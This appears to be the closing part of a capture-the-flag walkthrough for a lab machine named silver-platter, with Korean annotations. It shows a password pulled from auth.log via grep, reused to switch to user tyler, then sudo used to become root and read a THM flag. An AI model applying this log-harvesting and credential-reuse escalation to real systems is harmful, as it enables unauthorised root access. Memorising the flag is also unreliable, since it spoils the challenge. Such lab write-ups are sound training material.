/var/log/auth.log.2:Dec 12 19:39:25 silver-platter sudo: tyler : TTY=tty1 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/apt install nginx
/var/log/auth.log.2:Dec 12 19:39:25 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 12 19:39:42 silver-platter sudo: tyler : TTY=tty1 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/systemctl start nginx
/var/log/auth.log.2:Dec 12 19:39:42 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 12 19:39:47 silver-platter sudo: tyler : TTY=tty1 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/systemctl enable nginx
/var/log/auth.log.2:Dec 12 19:39:47 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 12 19:39:58 silver-platter sudo: tyler : TTY=tty1 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/sbin/ufw allow 80
/var/log/auth.log.2:Dec 12 19:39:58 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 09:08:18 silver-platter login[745]: pam_unix(login:session): session opened for user tyler(uid=1000) by LOGIN(uid=0)
/var/log/auth.log.2:Dec 13 09:08:18 silver-platter systemd-logind[698]: New session 1 of user tyler.
/var/log/auth.log.2:Dec 13 09:08:18 silver-platter systemd: pam_unix(systemd-user:session): session opened for user tyler(uid=1000) by (uid=0)
/var/log/auth.log.2:Dec 13 09:08:32 silver-platter sudo: tyler : TTY=tty1 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/sbin/nginx
/var/log/auth.log.2:Dec 13 09:08:32 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 15:08:51 silver-platter sudo: tyler : TTY=tty1 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/systemctl start nginx
/var/log/auth.log.2:Dec 13 15:08:51 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 15:11:15 silver-platter sudo: tyler : TTY=tty1 ; PWD=/etc/nginx/sites-available ; USER=root ; COMMAND=/usr/bin/nano default
/var/log/auth.log.2:Dec 13 15:11:15 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 15:10:28 silver-platter login[742]: pam_unix(login:session): session opened for user tyler(uid=1000) by LOGIN(uid=0)
/var/log/auth.log.2:Dec 13 15:10:28 silver-platter systemd-logind[700]: New session 1 of user tyler.
/var/log/auth.log.2:Dec 13 15:10:28 silver-platter systemd: pam_unix(systemd-user:session): session opened for user tyler(uid=1000) by (uid=0)
/var/log/auth.log.2:Dec 13 15:38:57 silver-platter sudo: tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/apt install docker.io
/var/log/auth.log.2:Dec 13 15:38:57 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 15:40:33 silver-platter sudo: tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name postgresql -d -e POSTGRES_PASSWORD=\_Zd_zx7N823/ -v postgresql-data:/var/lib/postgresql/data postgres:12.3
/var/log/auth.log.2:Dec 13 15:40:33 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 15:41:17 silver-platter sudo: tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker exec -it postgresql psql -U postgres
/var/log/auth.log.2:Dec 13 15:41:17 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 15:44:30 silver-platter sudo: tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=\_Zd_zx7N823/ -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database sivlerpeas:silverpeas-6.3.1
/var/log/auth.log.2:Dec 13 15:44:30 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 15:45:21 silver-platter sudo: tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=\_Zd_zx7N823/ -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database silverpeas:silverpeas-6.3.1
/var/log/auth.log.2:Dec 13 15:45:21 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 15:45:57 silver-platter sudo: tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=\_Zd_zx7N823/ -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database silverpeas:6.3.1
/var/log/auth.log.2:Dec 13 15:45:57 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 15:50:38 silver-platter sudo: tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/sbin/ufw allow 8080
/var/log/auth.log.2:Dec 13 15:50:38 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 15:51:13 silver-platter sudo: tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker ps
/var/log/auth.log.2:Dec 13 15:51:13 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 15:53:35 silver-platter sudo: tyler : TTY=tty1 ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/wget http://192.168.1.20/silverplatter.zip
/var/log/auth.log.2:Dec 13 15:53:35 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 15:53:44 silver-platter sudo: tyler : TTY=tty1 ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/apt install unzip
/var/log/auth.log.2:Dec 13 15:53:44 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 15:53:55 silver-platter sudo: tyler : TTY=tty1 ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/unzip silverplatter.zip
/var/log/auth.log.2:Dec 13 15:53:55 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 15:54:14 silver-platter sudo: tyler : TTY=tty1 ; PWD=/var/www/html/html5up-dimension ; USER=root ; COMMAND=/usr/bin/mv assets images index.html LICENSE.txt README.txt ../
/var/log/auth.log.2:Dec 13 15:54:14 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 15:54:39 silver-platter sudo: tyler : TTY=tty1 ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/rm silverplatter.zip
/var/log/auth.log.2:Dec 13 15:54:39 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 15:54:45 silver-platter sudo: tyler : TTY=tty1 ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/rm -rf html5up-dimension/
/var/log/auth.log.2:Dec 13 15:54:45 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 15:55:31 silver-platter sudo: tyler : TTY=tty1 ; PWD=/etc/nginx/sites-available ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
/var/log/auth.log.2:Dec 13 15:55:31 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 16:17:21 silver-platter sudo: tyler : TTY=tty1 ; PWD=/etc/nginx/sites-available ; USER=root ; COMMAND=/usr/bin/passwd tim
/var/log/auth.log.2:Dec 13 16:17:21 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 16:17:43 silver-platter sudo: tyler : TTY=tty1 ; PWD=/etc/nginx/sites-available ; USER=root ; COMMAND=/usr/sbin/ufw allow 22
/var/log/auth.log.2:Dec 13 16:17:43 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 16:18:10 silver-platter sudo: tyler : TTY=tty1 ; PWD=/etc/nginx/sites-available ; USER=root ; COMMAND=/usr/bin/systemctl ssh status
/var/log/auth.log.2:Dec 13 16:18:10 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 16:18:29 silver-platter sudo: tyler : TTY=tty1 ; PWD=/etc/nginx/sites-available ; USER=root ; COMMAND=/usr/bin/systemctl status ssh
/var/log/auth.log.2:Dec 13 16:18:29 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 16:18:57 silver-platter sshd[6879]: Accepted password for tyler from 192.168.1.20 port 47772 ssh2
/var/log/auth.log.2:Dec 13 16:18:57 silver-platter sshd[6879]: pam_unix(sshd:session): session opened for user tyler(uid=1000) by (uid=0)
/var/log/auth.log.2:Dec 13 16:18:57 silver-platter systemd-logind[700]: New session 5 of user tyler.
/var/log/auth.log.2:Dec 13 16:32:41 silver-platter sudo: tyler : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/passwd tim
/var/log/auth.log.2:Dec 13 16:32:41 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 16:33:03 silver-platter sshd[6977]: Disconnected from user tyler 192.168.1.20 port 47772
/var/log/auth.log.2:Dec 13 16:33:03 silver-platter sshd[6879]: pam_unix(sshd:session): session closed for user tyler
/var/log/auth.log.2:Dec 13 16:35:45 silver-platter sshd[7297]: Accepted password for tyler from 192.168.1.20 port 58172 ssh2
/var/log/auth.log.2:Dec 13 16:35:45 silver-platter sshd[7297]: pam_unix(sshd:session): session opened for user tyler(uid=1000) by (uid=0)
/var/log/auth.log.2:Dec 13 16:35:45 silver-platter systemd-logind[700]: New session 8 of user tyler.
/var/log/auth.log.2:Dec 13 16:36:35 silver-platter sudo: tyler : TTY=pts/0 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/sudo chsh -s /bin/bash tim
/var/log/auth.log.2:Dec 13 16:36:35 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 16:36:35 silver-platter sudo: root : TTY=pts/1 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/chsh -s /bin/bash tim
/var/log/auth.log.2:Dec 13 16:36:35 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=0)
/var/log/auth.log.2:Dec 13 16:37:24 silver-platter sudo: tyler : TTY=pts/0 ; PWD=/var/log/nginx ; USER=root ; COMMAND=/usr/bin/docker ps
/var/log/auth.log.2:Dec 13 16:37:24 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 16:37:38 silver-platter sudo: tyler : TTY=pts/0 ; PWD=/var/log/nginx ; USER=root ; COMMAND=/usr/bin/docker exec -it /bin/bash silverpeas
/var/log/auth.log.2:Dec 13 16:37:38 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 16:37:48 silver-platter sudo: tyler : TTY=pts/0 ; PWD=/var/log/nginx ; USER=root ; COMMAND=/usr/bin/docker exec -it silverpeas /bin/bash
/var/log/auth.log.2:Dec 13 16:37:48 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 16:40:44 silver-platter sudo: tyler : TTY=pts/0 ; PWD=/home ; USER=root ; COMMAND=/usr/bin/mkdir tim
/var/log/auth.log.2:Dec 13 16:40:44 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 16:40:51 silver-platter sudo: tyler : TTY=pts/0 ; PWD=/home ; USER=root ; COMMAND=/usr/bin/chmod 777 tim
/var/log/auth.log.2:Dec 13 16:40:51 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 16:41:08 silver-platter sudo: tyler : TTY=pts/0 ; PWD=/home ; USER=root ; COMMAND=/usr/bin/chmod 555 tim
/var/log/auth.log.2:Dec 13 16:41:08 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 16:41:30 silver-platter sudo: tyler : TTY=pts/0 ; PWD=/home/tim ; USER=root ; COMMAND=/usr/bin/nano user.txt
/var/log/auth.log.2:Dec 13 16:41:30 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 16:45:33 silver-platter sshd[7622]: Accepted password for tyler from 192.168.1.20 port 33484 ssh2
/var/log/auth.log.2:Dec 13 16:45:33 silver-platter sshd[7622]: pam_unix(sshd:session): session opened for user tyler(uid=1000) by (uid=0)
/var/log/auth.log.2:Dec 13 16:45:33 silver-platter systemd-logind[700]: New session 9 of user tyler.
/var/log/auth.log.2:Dec 13 16:45:42 silver-platter sudo: tyler : TTY=pts/1 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/su
/var/log/auth.log.2:Dec 13 16:45:42 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 16:45:42 silver-platter su: pam_unix(su:session): session opened for user root(uid=0) by tyler(uid=0)
/var/log/auth.log.2:Dec 13 17:43:09 silver-platter sshd[7750]: Accepted password for tyler from 192.168.1.20 port 45796 ssh2
/var/log/auth.log.2:Dec 13 17:43:09 silver-platter sshd[7750]: pam_unix(sshd:session): session opened for user tyler(uid=1000) by (uid=0)
/var/log/auth.log.2:Dec 13 17:43:09 silver-platter systemd-logind[700]: New session 10 of user tyler.
/var/log/auth.log.2:Dec 13 17:43:14 silver-platter sudo: tyler : TTY=pts/3 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/docker ps
/var/log/auth.log.2:Dec 13 17:43:14 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 17:43:18 silver-platter sudo: tyler : TTY=pts/3 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/docker stop silverpeas
/var/log/auth.log.2:Dec 13 17:43:18 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 17:43:34 silver-platter sudo: tyler : TTY=pts/3 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/docker stop postgresql
/var/log/auth.log.2:Dec 13 17:43:34 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 17:43:39 silver-platter sudo: tyler : TTY=pts/3 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/docker start postgresql
/var/log/auth.log.2:Dec 13 17:43:39 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 17:43:45 silver-platter sudo: tyler : TTY=pts/3 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/docker start silverpeas
/var/log/auth.log.2:Dec 13 17:43:45 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 17:43:47 silver-platter sudo: tyler : TTY=pts/3 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/docker ps
/var/log/auth.log.2:Dec 13 17:43:47 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 17:44:33 silver-platter sudo: tyler : TTY=pts/3 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/systemctl enable docker
/var/log/auth.log.2:Dec 13 17:44:33 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 17:44:46 silver-platter sudo: tyler : TTY=pts/3 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/docker stop silverpeas
/var/log/auth.log.2:Dec 13 17:44:46 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 17:45:01 silver-platter sudo: tyler : TTY=pts/3 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/docker stop postgresql
/var/log/auth.log.2:Dec 13 17:45:01 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 17:45:48 silver-platter sudo: tyler : TTY=pts/3 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/su
/var/log/auth.log.2:Dec 13 17:45:48 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 17:45:48 silver-platter su: pam_unix(su:session): session opened for user root(uid=0) by tyler(uid=0)
/var/log/auth.log.2:Dec 13 17:46:10 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=0)
/var/log/auth.log.2:Dec 13 17:51:30 silver-platter sshd[1370]: Accepted password for tyler from 192.168.1.20 port 60860 ssh2
/var/log/auth.log.2:Dec 13 17:51:30 silver-platter sshd[1370]: pam_unix(sshd:session): session opened for user tyler(uid=1000) by (uid=0)
/var/log/auth.log.2:Dec 13 17:51:30 silver-platter systemd-logind[708]: New session 2 of user tyler.
/var/log/auth.log.2:Dec 13 17:51:30 silver-platter systemd: pam_unix(systemd-user:session): session opened for user tyler(uid=1000) by (uid=0)
/var/log/auth.log.2:Dec 13 17:51:33 silver-platter sudo: tyler : TTY=pts/0 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/su
/var/log/auth.log.2:Dec 13 17:51:33 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 17:51:33 silver-platter su: pam_unix(su:session): session opened for user root(uid=0) by tyler(uid=0)
/var/log/auth.log.2:Dec 13 17:51:41 silver-platter sshd[1681]: Accepted password for tyler from 192.168.1.20 port 55392 ssh2
/var/log/auth.log.2:Dec 13 17:51:41 silver-platter sshd[1681]: pam_unix(sshd:session): session opened for user tyler(uid=1000) by (uid=0)
/var/log/auth.log.2:Dec 13 17:51:41 silver-platter systemd-logind[706]: New session 2 of user tyler.
/var/log/auth.log.2:Dec 13 17:51:41 silver-platter systemd: pam_unix(systemd-user:session): session opened for user tyler(uid=1000) by (uid=0)
/var/log/auth.log.2:Dec 13 17:51:44 silver-platter sudo: tyler : TTY=pts/0 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/su
/var/log/auth.log.2:Dec 13 17:51:44 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 17:51:44 silver-platter su: pam_unix(su:session): session opened for user root(uid=0) by tyler(uid=0)
grep: /var/log/btmp: Permission denied
grep: /var/log/btmp.1: Permission denied
/var/log/cloud-init.log:2023-12-12 19:31:35,421 - **init**.py[DEBUG]: Adding user tyler
/var/log/cloud-init.log:2023-12-12 19:31:35,421 - subp.py[DEBUG]: Running hidden command to protect sensitive input/output logstring: ['useradd', 'tyler', '--comment', 'root', '--groups', 'adm,cdrom,dip,lxd,plugdev,sudo', '--password', 'REDACTED', '--shell', '/bin/bash', '-m']
/var/log/cloud-init.log:2023-12-12 19:31:43,504 - util.py[DEBUG]: Changing the ownership of /home/tyler/.ssh to 1000:1000
/var/log/cloud-init.log:2023-12-12 19:31:43,505 - util.py[DEBUG]: Writing to /home/tyler/.ssh/authorized_keys - wb: [600] 0 bytes
/var/log/cloud-init.log:2023-12-12 19:31:43,505 - util.py[DEBUG]: Changing the ownership of /home/tyler/.ssh/authorized_keys to 1000:1000
/var/log/cloud-init.log:2023-12-12 19:31:43,505 - util.py[DEBUG]: Reading from /home/tyler/.ssh/authorized_keys (quiet=False)
/var/log/cloud-init.log:2023-12-12 19:31:43,505 - util.py[DEBUG]: Read 0 bytes from /home/tyler/.ssh/authorized_keys
/var/log/installer/subiquity-server-debug.log.2061:2023-12-12 18:32:49,766 INFO aiohttp.access:206 [12/Dec/2023:18:32:49 +0000] "GET /identity/validate_username?username=%22tyler%22 HTTP/1.1" 200 190 "-" "Python/3.10 aiohttp/3.8.1"
/var/log/installer/subiquity-server-debug.log:2023-12-12 18:32:49,766 INFO aiohttp.access:206 [12/Dec/2023:18:32:49 +0000] "GET /identity/validate_username?username=%22tyler%22 HTTP/1.1" 200 190 "-" "Python/3.10 aiohttp/3.8.1"
/var/log/installer/subiquity-server-info.log.2061:2023-12-12 18:32:49,766 INFO aiohttp.access:206 [12/Dec/2023:18:32:49 +0000] "GET /identity/validate_username?username=%22tyler%22 HTTP/1.1" 200 190 "-" "Python/3.10 aiohttp/3.8.1"
/var/log/installer/autoinstall-user-data: username: tyler
/var/log/installer/subiquity-client-debug.log.2016:2023-12-12 18:33:08,966 DEBUG subiquity.client.controllers.identity:47 IdentityController.done next_screen user_spec=IdentityData(realname='root', username='tyler', hostname='silver-platter')
/var/log/installer/subiquity-client-debug.log:2023-12-12 18:33:08,966 DEBUG subiquity.client.controllers.identity:47 IdentityController.done next_screen user_spec=IdentityData(realname='root', username='tyler', hostname='silver-platter')
/var/log/installer/subiquity-server-info.log:2023-12-12 18:32:49,766 INFO aiohttp.access:206 [12/Dec/2023:18:32:49 +0000] "GET /identity/validate_username?username=%22tyler%22 HTTP/1.1" 200 190 "-" "Python/3.10 aiohttp/3.8.1"
grep: /var/log/journal/d66e774f203b4ca082267956397615f9/system@00060c62cdfff767-69d92e040e3893c8.journal~: binary file matches
grep: /var/log/journal/d66e774f203b4ca082267956397615f9/user-1000@00060c60820e1bfd-b67d49e49318015d.journal~: binary file matches
grep: /var/log/journal/d66e774f203b4ca082267956397615f9/user-1000@00060c65914530c9-1945e38185741a3f.journal~: binary file matches
grep: /var/log/journal/d66e774f203b4ca082267956397615f9/system@00060c60944e041f-1ed71084930fd9b6.journal~: binary file matches
grep: /var/log/journal/d66e774f203b4ca082267956397615f9/system@000617ed8147f9c4-ef08451dfa7f835a.journal~: binary file matches
grep: /var/log/journal/d66e774f203b4ca082267956397615f9/user-1000@000617f1bb16d65f-cbb5fdcfa0b23b27.journal~: binary file matches
grep: /var/log/journal/d66e774f203b4ca082267956397615f9/system@00060c62ba0aefdf-7318e0fbef468a84.journal~: binary file matches
grep: /var/log/journal/d66e774f203b4ca082267956397615f9/system@00060c5028d78256-2f29871609658f18.journal~: binary file matches
grep: /var/log/journal/d66e774f203b4ca082267956397615f9/user-1001.journal: binary file matches
grep: /var/log/journal/d66e774f203b4ca082267956397615f9/user-1000@1c787f413f9c4e3994a2bcb435082f25-00000000000003c5-00060c659145207a.journal: binary file matches
grep: /var/log/journal/d66e774f203b4ca082267956397615f9/user-1000@00063a3f0ea72f9c-a12ef0d813fb7fa1.journal~: binary file matches
grep: /var/log/journal/d66e774f203b4ca082267956397615f9/system@000617f20eb74b4e-1f4ec0322f5114b4.journal~: binary file matches
grep: /var/log/journal/d66e774f203b4ca082267956397615f9/system@1a94d482ec724c11a36274b2be6c3142-0000000000000001-00060c62cdfec16a.journal: binary file matches
grep: /var/log/journal/d66e774f203b4ca082267956397615f9/system@00060c6080f639e9-f480de5c4c514a03.journal~: binary file matches
grep: /var/log/journal/d66e774f203b4ca082267956397615f9/system@000617ed8706907e-4d7911b631d8e187.journal~: binary file matches
grep: /var/log/journal/d66e774f203b4ca082267956397615f9/user-1000@000617676b0532a1-789b58b9ea73ae14.journal~: binary file matches
grep: /var/log/journal/d66e774f203b4ca082267956397615f9/system@0006176348e54237-37314503d21fd73c.journal~: binary file matches
grep: /var/log/private: Permission denied
/var/log/syslog.1:May 8 08:58:40 silver-platter systemd[1]: Started Session 2 of User tyler.
/var/log/syslog.1:May 8 14:00:53 silver-platter systemd[1]: Started Session 2 of User tyler.
grep: /var/log/wtmp: binary file matches
tim@silver-platter:~$

# \_Zd_zx7N823/ 비밀번호 다시 시도하기 -> 주의해서 복사하자! 처음부터 끝까지 확인하고 복붙!

# 타일러로 접속 완료

-bash: \_Zd_zx7N823/: No such file or directory
tim@silver-platter:~$ su tyler
Password: \_Zd_zx7N823/
tyler@silver-platter:/home/tim$

# sudo -l -> 전체 허용 확인

tyler@silver-platter:/home/tim$ sudo -l
[sudo] password for tyler:
Matching Defaults entries for tyler on silver-platter:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User tyler may run the following commands on silver-platter:
(ALL : ALL) ALL
tyler@silver-platter:/home/tim$

# 루팅 완료

tyler@silver-platter:/home/tim$ sudo su root
root@silver-platter:/home/tim#

# root.txt 획득

root@silver-platter:/# cd /
root@silver-platter:/# ls
bin boot dev etc home lib lib32 lib64 libx32 lost+found media mnt opt proc root run sbin snap srv sys tmp usr var
root@silver-platter:/# cd /root
root@silver-platter:~# ls
root.txt snap start_docker_containers.sh
root@silver-platter:~# cat root.txt
THM{098f6bcd4621d373cade4e832627b4f6}
root@silver-platter:~#
